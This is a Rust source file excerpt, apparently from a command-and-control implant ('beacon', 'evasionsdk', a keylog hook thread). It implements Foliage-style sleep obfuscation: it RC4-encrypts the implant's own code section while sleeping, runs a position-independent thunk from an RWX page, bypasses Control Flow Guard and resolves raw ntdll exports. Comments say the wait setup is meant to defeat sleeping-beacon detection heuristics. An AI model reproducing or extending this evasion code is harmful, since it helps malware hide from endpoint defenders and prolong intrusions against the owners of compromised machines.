    type DeleteTQFn = unsafe extern "system" fn(*mut c_void) -> i32;
    let del_fn: DeleteTQFn = unsafe { core::mem::transmute(delete_timer_queue) };
    unsafe { del_fn(h_timer_queue) };

    // Reclaim leaked boxes.
    unsafe {
        let _ = Box::from_raw(key_buf);
        let _ = Box::from_raw(old_protect_box);
    }

    if verified {
        FOLIAGE_APC_OK.store(1, core::sync::atomic::Ordering::Release);
        true
    } else {
        FOLIAGE_APC_OK.store(2, core::sync::atomic::Ordering::Release);
        false
    }
}

/// Mark `addr` as a valid CFG call target using `SetProcessValidCallTargets`
/// (kernelbase.dll, official Win10+ API). Falls back to the NT path
/// (NtSetInformationVirtualMemory) if kernelbase isn't resolvable.
///
/// CRITICAL: CFG_CALL_TARGET_INFO.Offset MUST be 16-byte aligned.
/// Returns true on success or if CFG is not enabled (non-fatal).
#[allow(dead_code)]
fn mark_cfg_valid(addr: usize) -> bool {
    // Try the official API first (kernelbase.dll — Win10+).
    let spvct = unsafe {
        crate::resolve::export_addr(b"kernelbase.dll", b"SetProcessValidCallTargets")
    };
    // Try SetProcessValidCallTargets first. If it succeeds, done.
    if let Some(a) = spvct {
        if mark_cfg_valid_std(addr, a) {
            return true;
        }
        // SetProcessValidCallTargets failed — fall through to NT path.
    }
    // Fall back to NT path (also tried as primary when kernelbase unavailable).
    mark_cfg_valid_nt(addr)
}

/// CFG bypass via SetProcessValidCallTargets (kernelbase.dll).
#[allow(dead_code)]
fn mark_cfg_valid_std(addr: usize, spvct: usize) -> bool {
    let nt_query_vm = match unsafe {
        crate::resolve::export_addr(b"ntdll.dll", b"NtQueryVirtualMemory")
    } {
        Some(a) => a,
        None => return false,
    };

    #[repr(C)]
    struct Mbi { base: *mut c_void, alloc_base: *mut c_void, alloc_prot: u32, _p1: u32,
        reg_size: usize, state: u32, prot: u32, typ: u32, _p2: u32 }
    #[repr(C)]
    struct CfgInfo { offset: usize, flags: usize }

    type QueryVm = unsafe extern "system" fn(
        *mut c_void, *const c_void, u32, *mut c_void, usize, *mut usize) -> i32;
    type SpvctFn = unsafe extern "system" fn(
        *mut c_void, *const c_void, usize, u32, *const CfgInfo) -> i32;

    let query: QueryVm = unsafe { core::mem::transmute(nt_query_vm) };
    let spvct_fn: SpvctFn = unsafe { core::mem::transmute(spvct) };
    const CUR: *mut c_void = -1isize as *mut c_void;

    let mut mbi = Mbi { base: core::ptr::null_mut(), alloc_base: core::ptr::null_mut(),
        alloc_prot: 0, _p1: 0, reg_size: 0, state: 0, prot: 0, typ: 0, _p2: 0 };
    let mut rl: usize = 0;
    if unsafe { query(CUR, addr as *const c_void, 0,
        &mut mbi as *mut Mbi as *mut c_void, core::mem::size_of::<Mbi>(), &mut rl) } < 0 {
        return false;
    }
    if mbi.state != 0x1000 || mbi.typ != 0x1000000 { return false; }

    // 16-byte aligned offset from allocation base.
    let offset = (addr.wrapping_sub(mbi.alloc_base as usize)) & !0xF;
    let info = CfgInfo { offset, flags: 1 };
    unsafe { spvct_fn(CUR, mbi.alloc_base, mbi.reg_size, 1, &info) != 0 }
}

/// Fallback CFG bypass via NtSetInformationVirtualMemory (ntdll).
#[allow(dead_code)]
fn mark_cfg_valid_nt(addr: usize) -> bool {
    let nt_query_vm = match unsafe {
        crate::resolve::export_addr(b"ntdll.dll", b"NtQueryVirtualMemory")
    } { Some(a) => a, None => return false };
    let nt_set_vm = match unsafe {
        crate::resolve::export_addr(b"ntdll.dll", b"NtSetInformationVirtualMemory")
    } { Some(a) => a, None => return true };

    #[repr(C)]
    struct Mbi { base: *mut c_void, alloc_base: *mut c_void, alloc_prot: u32, _p1: u32,
        reg_size: usize, state: u32, prot: u32, typ: u32, _p2: u32 }
    #[repr(C)]
    struct Cti { offset: usize, flags: u32 }
    #[repr(C)]
    struct Mre { va: *mut c_void, nb: usize }
    #[repr(C)]
    struct Vmi { n: u32, _pad: u32, z1: usize, z2: usize, pt: *mut Cti, out: *mut u32 }

    type QueryVm = unsafe extern "system" fn(
        *mut c_void, *const c_void, u32, *mut c_void, usize, *mut usize) -> i32;
    type SetVm = unsafe extern "system" fn(
        *mut c_void, u32, usize, *mut Mre, *mut Vmi, u32) -> i32;

    let query: QueryVm = unsafe { core::mem::transmute(nt_query_vm) };
    let set: SetVm = unsafe { core::mem::transmute(nt_set_vm) };
    const CUR: *mut c_void = -1isize as *mut c_void;

    let mut mbi = Mbi { base: core::ptr::null_mut(), alloc_base: core::ptr::null_mut(),
        alloc_prot: 0, _p1: 0, reg_size: 0, state: 0, prot: 0, typ: 0, _p2: 0 };
    let mut rl: usize = 0;
    if unsafe { query(CUR, addr as *const c_void, 0,
        &mut mbi as *mut Mbi as *mut c_void, core::mem::size_of::<Mbi>(), &mut rl) } < 0 {
        return false;
    }
    if mbi.state != 0x1000 || mbi.typ != 0x1000000 { return false; }

    let offset = (addr.wrapping_sub(mbi.alloc_base as usize)) & !0xF;
    let mut cti = Cti { offset, flags: 1 };
    let mut mre = Mre { va: mbi.alloc_base, nb: mbi.reg_size };
    let mut out: u32 = 0;
    let mut vmi = Vmi { n: 1, _pad: 0, z1: 0, z2: 0, pt: &mut cti, out: &mut out };

    let st = unsafe { set(CUR, 4, 1, &mut mre, &mut vmi, core::mem::size_of::<Vmi>() as u32) };
    st >= 0 || st == -0x3FBBi32
}

/// RC4 shim with the calling convention the PIC thunk expects:
///   `extern "system" fn(key: *const u8, key_len: usize, buf: *mut u8, len: usize)`
/// Calls the evasionsdk's mask_region (RC4 is symmetric — mask = unmask).
/// This fn itself lives in .text, but it's called by the thunk DURING the
/// brief window between protect(RW) and the mask — at that point .text is
/// still cleartext (the RC4 hasn't happened yet). The danger window is only
/// during the NtWait (when .text is ciphertext), and during that window the
/// thunk executes from the allocated page (not .text), not this shim.
#[allow(dead_code)]
unsafe extern "system" fn rc4_shim(
    key: *const u8,
    key_len: usize,
    buf: *mut u8,
    len: usize,
) {
    if key.is_null() || buf.is_null() || key_len < 16 || len == 0 {
        return;
    }
    let key_arr: &[u8; 16] = unsafe { &*(key as *const [u8; 16]) };
    let slice: &mut [u8] = unsafe { core::slice::from_raw_parts_mut(buf, len) };
    nyx_implant_evasionsdk::foliage::mask_region(key_arr, slice);
}

/// No-op RC4 shim (diagnostic — does nothing, just returns). Used to test if
/// the thunk's protect/wait/protect path works WITHOUT the RC4 step.
#[allow(dead_code)]
unsafe extern "system" fn rc4_nop(_key: *const u8, _key_len: usize, _buf: *mut u8, _len: usize) {}

/// Pack two usize values (thunk_code_addr + params_addr) into the single
/// `usize` parameter that `raw_create_thread` accepts.
#[allow(dead_code)]
#[repr(C)]
struct ThunkCallParams {
    thunk_addr: usize,
    params_addr: usize,
}
impl ThunkCallParams {
    #[allow(dead_code)]
    fn pack(thunk_addr: usize, params_addr: usize) -> usize {
        // We can't pass a struct through the usize param, so leak a Box and
        // pass the pointer. The caller (execute_foliage_apc) doesn't reclaim
        // this — it's a tiny 16-byte block, acceptable leak for the sleep window.
        Box::into_raw(Box::new(ThunkCallParams {
            thunk_addr,
            params_addr,
        })) as usize
    }
}

/// Helper-thread entry point. Receives a `*mut ThunkCallParams` (packed into
/// usize), reads the thunk code address + params address, transmutes the thunk
/// code to a fn pointer, and calls it with params in rcx.
///
/// This fn itself lives in .text — but it's only called ONCE (at helper spawn)
/// and returns immediately after the thunk call. The thunk runs from the RWX
/// page. During the thunk's NtWait (when .text is ciphertext), this fn is
/// NOT executing — it's blocked on the `call` instruction waiting for the
/// thunk to return. The `call` instruction itself is in .text, but it has
/// already been fetched and decoded before the thunk encrypts .text.
///
/// # Safety
/// `param` is a leaked `*mut ThunkCallParams`. The thunk code at `thunk_addr`
/// must be valid PIC machine code that returns via `ret`.
#[allow(dead_code)]
unsafe extern "system" fn foliage_thunk_caller(param: usize) -> u32 {
    let p: &ThunkCallParams = unsafe { &*(param as *const ThunkCallParams) };

    // DIAGNOSTIC: RC4 mask/unmask + NtWait (NO NtProtect). This tests if the
    // crash is specifically in NtProtectVirtualMemory. .text stays RX (can't
    // write to it → RC4 will crash on the write). So instead: RC4 a DIFFERENT
    // buffer (the thunk page itself, harmless). Actually just test NtWait
    // which already passed. Skip this diagnostic — use the real thunk but
    // with the REX fix in pic_thunk.rs. The real test is below.

    let thunk_fn: unsafe extern "system" fn(usize) -> u32 =
        unsafe { core::mem::transmute(p.thunk_addr) };
    let _ = unsafe { thunk_fn(p.params_addr) };
    let _ = unsafe { Box::from_raw(param as *mut ThunkCallParams) };
    0
}

/// Byte snapshot for round-trip verification (leaked box, shared beacon/helper).
#[allow(dead_code)]
#[repr(C)]
struct VerifyState {
    before: [u8; 16],
    ok: core::sync::atomic::AtomicBool,
}

/// Parameters passed to the helper thread (leaked box).
#[allow(dead_code)]
#[repr(C)]
struct FoliageParams {
    text_base: usize,
    text_len: usize,
    key: [u8; 16],
    secs: u32,
    raw: FoliageRaw,
    verify: *mut VerifyState,
    /// Optional spoof RIP for NtContinue CONTEXT (None = no context spoof).
    spoof_rip: Option<u64>,
    /// The beacon thread's original CONTEXT, captured by NtGetContextThread on
    /// the beacon thread BEFORE the helper was spawned. The helper reads
    /// `saved_ctx.rsp()` to build the spoofed CONTEXT with the real RSP.
    /// This is the full 1232-byte CONTEXT; the helper does NOT call
    /// NtGetContextThread itself (the indirect-runtime trampoline is single-
    /// instance, and the beacon's context must be captured while it's still
    /// in its normal execution flow).
    saved_ctx: *mut crate::context::Context,
    /// The beacon thread's REAL handle (not pseudo). Used by the helper for
    /// NtQueueApcThread. Duplicated from `raw.beacon_thread_handle` for
    /// clarity — same value, but explicit in the params struct.
    beacon_handle: usize,
}

/// Bundle of raw export fn-pointers the helper thread uses (resolved once on
/// the beacon thread, copied into the helper's param block). NONE of these go
/// through the indirect syscall runtime — they call the export directly.
///
/// The beacon thread's REAL handle (not pseudo) is passed separately via
/// `FoliageParams::beacon_thread_handle` — `NtQueueApcThread` with a
/// pseudo-handle resolves to the calling thread, NOT the beacon.
#[allow(dead_code)]
#[derive(Clone, Copy)]
pub struct FoliageRaw {
    nt_protect: usize,
    nt_wait_for_single_object: usize,
    nt_queue_apc_thread: usize,
    nt_get_context_thread: usize,
    nt_set_context_thread: usize,
    wait_for_single_object: usize,
}

#[allow(dead_code)]
impl FoliageRaw {
    /// Resolve all the raw exports the Foliage chain needs. Returns None if any
    /// is missing (caller degrades).
    ///
    /// Note: NtGetContextThread/NtSetContextThread and NtContinue are resolved
    /// in FoliageRaw (for the helper's use), while NtOpenThread is resolved
    /// on-demand in `execute_foliage_apc` (it needs the handle first).
    ///
    /// # Safety
    /// Resolves export addresses via PEB walk (read-only). Beacon thread.
    unsafe fn resolve() -> Option<Self> {
        let nt_protect = crate::resolve::export_addr(b"ntdll.dll", b"NtProtectVirtualMemory")?;
        let nt_wait_for_single_object =
            crate::resolve::export_addr(b"ntdll.dll", b"NtWaitForSingleObject")?;
        let nt_queue_apc_thread = crate::resolve::export_addr(b"ntdll.dll", b"NtQueueApcThread")?;
        let nt_get_context_thread =
            crate::resolve::export_addr(b"ntdll.dll", b"NtGetContextThread")?;
        let nt_set_context_thread =
            crate::resolve::export_addr(b"ntdll.dll", b"NtSetContextThread")?;
        let wait_for_single_object =
            crate::resolve::export_addr(b"kernel32.dll", b"WaitForSingleObject")?;
        Some(Self {
            nt_protect,
            nt_wait_for_single_object,
            nt_queue_apc_thread,
            nt_get_context_thread,
            nt_set_context_thread,
            wait_for_single_object,
        })
    }

    /// Raw NtProtectVirtualMemory(ProcessHandle=-1, BaseAddress*, RegionSize*,
    /// NewProtection, OldProtection*). Returns the NTSTATUS.
    ///
    /// # Safety
    /// `base`/`size`/`old` must be valid mutable pointers.
    pub(crate) unsafe fn nt_protect_virtual_memory(
        &self,
        base: &mut usize,
        size: &mut usize,
        new_prot: u32,
        old: &mut u32,
    ) -> i32 {
        type Fn = unsafe extern "system" fn(usize, *mut usize, *mut usize, u32, *mut u32) -> i32;
        let f: Fn = unsafe { core::mem::transmute(self.nt_protect) };
        unsafe { f(0xFFFF_FFFF_FFFF_FFFF, base, size, new_prot, old) }
    }

    /// Raw NtWaitForSingleObject(Handle, Alertable, Timeout*).
    /// With `Handle = INVALID_HANDLE_VALUE` (-1) and `Alertable = TRUE`, gives
    /// wait-reason `UserRequest` instead of `DelayExecution`, defeating
    /// Hunt-Sleeping-Beacons heuristics. The helper's APC can still wake us.
    ///
    /// # Safety
    /// `timeout` must point at a valid i64 (100ns units, negative = relative).
    unsafe fn nt_wait_for_single_object(
        &self,
        handle: usize,
        alertable: u8,
        timeout: usize,
    ) -> i32 {
        type Fn = unsafe extern "system" fn(usize, u8, *const i64) -> i32;
        let f: Fn = unsafe { core::mem::transmute(self.nt_wait_for_single_object) };
        unsafe { f(handle, alertable, timeout as *const i64) }
    }

    /// Raw NtQueueApcThread(ThreadHandle, ApcRoutine, Arg1, Arg2, Arg3).
    ///
    /// # Safety
    /// `thread` must be a real thread handle with THREAD_SET_CONTEXT.
    unsafe fn nt_queue_apc_thread(
        &self,
        thread: usize,
        routine: usize,
        a1: usize,
        a2: usize,
        a3: usize,
    ) -> i32 {
        type Fn = unsafe extern "system" fn(usize, usize, usize, usize, usize) -> i32;
        let f: Fn = unsafe { core::mem::transmute(self.nt_queue_apc_thread) };
        unsafe { f(thread, routine, a1, a2, a3) }
    }

    /// Raw WaitForSingleObject(handle, ms).
    unsafe fn wait_for_single_object(&self, handle: usize, ms: u32) -> u32 {
        type Fn = unsafe extern "system" fn(usize, u32) -> u32;
        let f: Fn = unsafe { core::mem::transmute(self.wait_for_single_object) };
        unsafe { f(handle, ms) }
    }

    /// Raw NtGetContextThread(ThreadHandle, ContextRecord) — 2 real args.
    /// Captures the register state of `thread` into `ctx`. Used by the beacon
    /// thread (before spawning the helper) to snapshot its original CONTEXT.
    ///
    /// # Safety
    /// `ctx` must point at an aligned, writable 1232-byte CONTEXT buffer.
    unsafe fn nt_get_context_thread(&self, thread: usize, ctx: usize) -> i32 {
        type Fn = unsafe extern "system" fn(usize, usize) -> i32;
        let f: Fn = unsafe { core::mem::transmute(self.nt_get_context_thread) };
        unsafe { f(thread, ctx) }
    }

    /// Raw NtSetContextThread(ThreadHandle, ContextRecord) — 2 real args.
    /// Installs `ctx` as the register state of `thread`. Used to restore the
    /// beacon thread's original CONTEXT after the mask→sleep→unmask cycle.
    ///
    /// # Safety
    /// `ctx` must point at a valid CONTEXT. Only call when the thread is in a
    /// controlled window (after joining the helper, before the beacon resumes
    /// normal execution).
    unsafe fn nt_set_context_thread(&self, thread: usize, ctx: usize) -> i32 {
        type Fn = unsafe extern "system" fn(usize, usize) -> i32;
        let f: Fn = unsafe { core::mem::transmute(self.nt_set_context_thread) };
        unsafe { f(thread, ctx) }
    }
}

/// Raw kernel32!CreateThread → spawn `entry(param)`. Returns the thread handle
/// or None on failure.
///
/// # Safety
/// `entry` must be a valid thread-proc-style fn (usize arg → u32). Runs the
/// entry on a new thread.
/// Spawn a raw Win32 thread (kernel32!CreateThread) that runs entirely on raw
/// exports — bypassing the shared indirect-syscall trampoline (`syscalls::global()`).
///
/// `pub(crate)` so the keylog hook thread (P2) can reuse this without
/// duplicating the CreateThread resolution. Returns the thread handle (owned
/// by the caller; Close via `NtClose`).
pub(crate) unsafe fn raw_create_thread(
    entry: unsafe extern "system" fn(usize) -> u32,
    param: usize,
) -> Option<usize> {
    let addr = crate::resolve::export_addr(b"kernel32.dll", b"CreateThread")?;
    type Fn = unsafe extern "system" fn(
        *mut core::ffi::c_void,                          // lpThreadAttributes
        usize,                                           // dwStackSize
        Option<unsafe extern "system" fn(usize) -> u32>, // lpStartAddress
        usize,                                           // lpParameter
        u32,                                             // dwCreationFlags
        *mut u32,                                        // lpThreadId
    ) -> *mut core::ffi::c_void;
    let f: Fn = unsafe { core::mem::transmute(addr) };
    let h = unsafe {
        f(
            core::ptr::null_mut(),
            0,
            Some(entry),
            param,
            0,
            core::ptr::null_mut(),
        )
    };
    if h.is_null() {
        None
    } else {
        Some(h as usize)
    }
}

/// The helper thread entry. Runs ENTIRELY on raw exports (not the indirect
/// runtime) to avoid the single-trampoline race. Sequence:
///   1. NtProtectVirtualMemory(.text, RX->RW)
///   2. RC4-encrypt .text  <- .text is now ciphertext
///   3. Queue APC into the beacon's alertable window:
///      - If spoof_rip is Some (and GetContext succeeded on beacon thread):
///        build a spoofed CONTEXT with RIP = gap address and RSP = beacon's
///        original RSP (from saved_ctx captured by step 4 on the beacon thread
///        before this helper was spawned). Queue via NtContinue APC.
///      - If spoof_rip is None: queue a benign no-op APC to break the sleep.
///   4. NtDelayExecution(secs) — the helper sleeps the mask window
///   5. RC4-decrypt .text     <- .text restored to cleartext
///   6. NtProtectVirtualMemory(.text, RW->RX)
///   7. verify .text[0..16] matches the pre-mask snapshot
///   8. exit (return 0)
///
/// Note: NtGetContextThread / NtSetContextThread are NOT called here — they run
/// on the beacon thread (before this helper spawns and after it joins,
/// respectively) in `execute_foliage_apc`.
///
/// # Safety
/// `param` is a `*mut FoliageParams`. This function takes ownership and
/// reclaims the box before returning. Mutates the implant's `.text`.
#[allow(dead_code)]
unsafe extern "system" fn foliage_helper(param: usize) -> u32 {
    // Take ownership of the FoliageParams + VerifyState boxes up front so we
    // can reclaim them on all exit paths. Copy needed fields to locals, then
    // immediately drop the boxes to avoid long-lived borrows from the param.
    let p_box = Box::from_raw(param as *mut FoliageParams);
    let raw = p_box.raw;
    let base = p_box.text_base;
    let len = p_box.text_len;
    let secs = p_box.secs;
    let key = p_box.key;
    let verify_raw = p_box.verify;
    drop(p_box); // FoliageParams is on the stack now, reclaim early

    // ---- Gate: PIC thunk not validated → data-only floor ----
    if !FOLIAGE_APC_THUNK_WIRED.load(Ordering::Acquire) {
        let delay: i64 = -((secs as i64).saturating_mul(10_000_000));
        const INVALID_HANDLE: usize = 0xFFFF_FFFF_FFFF_FFFF;
        let _ = unsafe {
            raw.nt_wait_for_single_object(INVALID_HANDLE, 0, &delay as *const i64 as usize)
        };
        // Reclaim VerifyState.
        if !verify_raw.is_null() {
            let _ = Box::from_raw(verify_raw);
        }
        return 0;
    }

    // ---- THUNK WIRED: build PIC thunk, execute from RWX page ----
    let nt_alloc_addr = match unsafe {
        crate::resolve::export_addr(b"ntdll.dll", b"NtAllocateVirtualMemory")
    } {
        Some(a) => a,
        None => {
            if !verify_raw.is_null() { let _ = Box::from_raw(verify_raw); }
            return 1;
        }
    };
    let nt_free_addr = match unsafe {
        crate::resolve::export_addr(b"ntdll.dll", b"NtFreeVirtualMemory")
    } {
        Some(a) => a,
        None => {
            if !verify_raw.is_null() { let _ = Box::from_raw(verify_raw); }
            return 1;
        }
    };

    // ---- Resolve SystemFunction032 from advapi32.dll ---------------------
    let sf032_addr = match unsafe {
        crate::resolve::export_addr(b"advapi32.dll", b"SystemFunction032")
    } {
        Some(a) => a,
        None => {
            let delay: i64 = -((secs as i64).saturating_mul(10_000_000));
            const INVALID_HANDLE: usize = 0xFFFF_FFFF_FFFF_FFFF;
            let _ = unsafe {
                raw.nt_wait_for_single_object(INVALID_HANDLE, 0, &delay as *const i64 as usize)
            };
            if !verify_raw.is_null() { let _ = Box::from_raw(verify_raw); }
            return 0;
        }
    };

    // Build the PIC RC4 wrapper.
    let (wrapper_bytes, wrapper_len) = crate::pic_thunk::build_rc4_sf032_wrapper(sf032_addr);

    // Build the thunk params block.
    let delay_100ns: i64 = -((secs as i64).saturating_mul(10_000_000));
    let params = Box::into_raw(Box::new(crate::pic_thunk::PicThunkParams {
        nt_protect_virtual_memory: raw.nt_protect,
        nt_wait_for_single_object: raw.nt_wait_for_single_object,
        invalid_handle: 0xFFFF_FFFF_FFFF_FFFF,
        rc4_mask: 0,
        text_base: base,
        text_len: len,
        key,
        delay_100ns,
        status: core::sync::atomic::AtomicU32::new(0),
    }));

    // Allocate one RWX page for wrapper + thunk.
    type NtAllocFn =
        unsafe extern "system" fn(usize, *mut *mut c_void, *mut usize, u32, u32) -> i32;
    let nt_alloc: NtAllocFn = unsafe { core::mem::transmute(nt_alloc_addr) };
    let mut page: *mut c_void = core::ptr::null_mut();
    let mut page_size: usize = 0x1000;
    const MEM_COMMIT: u32 = 0x1000;
    const MEM_RESERVE: u32 = 0x2000;
    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
    let st = unsafe { nt_alloc(!0usize, &mut page, &mut page_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) };
    if st < 0 || page.is_null() {
        let _ = unsafe { Box::from_raw(params) };
        if !verify_raw.is_null() { let _ = Box::from_raw(verify_raw); }
        return 1;
    }

    // Place the RC4 wrapper at the start of the page, then the thunk right after.
    let wrapper_addr = page as usize;
    let thunk_addr = wrapper_addr + wrapper_len;
    unsafe { core::ptr::copy_nonoverlapping(wrapper_bytes.as_ptr(), page as *mut u8, wrapper_len); }

    // Build and copy the PIC thunk.
    let thunk = crate::pic_thunk::build_mask_thunk();
    unsafe { core::ptr::copy_nonoverlapping(thunk.bytes.as_ptr(), thunk_addr as *mut u8, thunk.len); }

    // Wire rc4_mask to the wrapper.
    unsafe { (*params).rc4_mask = wrapper_addr; }

    // Call the thunk.
    let thunk_fn: unsafe extern "system" fn(usize) -> u32 =
        unsafe { core::mem::transmute(thunk_addr) };
    let _ = unsafe { thunk_fn(params as usize) };

    // Free the RWX page.
    type NtFreeFn =
        unsafe extern "system" fn(usize, *mut *mut c_void, *mut usize, u32) -> i32;
    let nt_free: NtFreeFn = unsafe { core::mem::transmute(nt_free_addr) };
    const MEM_RELEASE: u32 = 0x8000;
    let mut free_size: usize = 0;
    let _ = unsafe { nt_free(0xFFFF_FFFF_FFFF_FFFF, &mut page, &mut free_size, MEM_RELEASE) };

    // Reclaim the leaked params block.
    let _ = unsafe { Box::from_raw(params) };

    // Verify .text round-trip.
    if !verify_raw.is_null() {
        let v: &VerifyState = unsafe { &*verify_raw };
        let mut after = [0u8; 16];
        unsafe { core::ptr::copy_nonoverlapping(base as *const u8, after.as_mut_ptr(), 16) };
        if after == v.before {
            v.ok.store(true, core::sync::atomic::Ordering::Release);
        }
        let _ = Box::from_raw(verify_raw);
    }

    0
}

/// A no-op APC routine (signature: extern "system" fn(ApcContext1, ApcContext2,
/// ApcContext3) — NtQueueApcThread's 3 user args). Used to wake the beacon's
/// alertable sleep benignly. It executes from its own (helper-provided) context
/// and returns without touching .text.
#[allow(dead_code)]
#[allow(unused_variables)]
unsafe extern "system" fn apc_noop(a1: usize, a2: usize, a3: usize) {
    // Intentionally empty: the APC's purpose is to make the beacon's
    // alertable sleep return (driving the masked-window sequence). The beacon
    // resumes with .text already restored (the helper unmasked before we wake).
}

/// Extract the sleep seconds from the plan's Sleep step.
#[allow(dead_code)]
fn plan_seconds(plan: &FoliagePlan) -> u32 {
    plan.steps
        .iter()
        .find_map(|s| {
            if let FoliageStep::Sleep { seconds } = s {
                Some(*seconds)
            } else {
                None
            }
        })
        .unwrap_or(1)
}
